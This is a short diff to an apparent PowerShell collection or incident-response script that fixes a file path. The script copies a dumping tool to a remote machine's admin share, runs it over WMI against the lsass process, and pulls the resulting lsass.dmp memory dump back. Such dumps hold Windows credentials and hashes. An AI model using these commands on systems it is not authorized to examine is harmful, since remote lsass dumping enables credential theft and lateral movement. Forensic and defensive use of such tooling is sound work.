@@ -569,7 +569,7 @@ else {
         }
         #>
         Copy-Item -Path "$scriptPath\dp.exe" -Destination "\\$computername\c$\windows\temp\dp.exe"
-        $dumpAProcessPath = "C:\temp\dp.exe"
+        $dumpAProcessPath = "C:\Windows\temp\dp.exe"
         Run-WmiRemoteProcess $computername "$dumpAProcessPath lsass c:\temp" | Wait-Process
         Start-Sleep -Seconds 15
         Copy-Item -Path "\\$computername\\c$\windows\temp\lsass.dmp" -Destination "$logDirectoryPath"
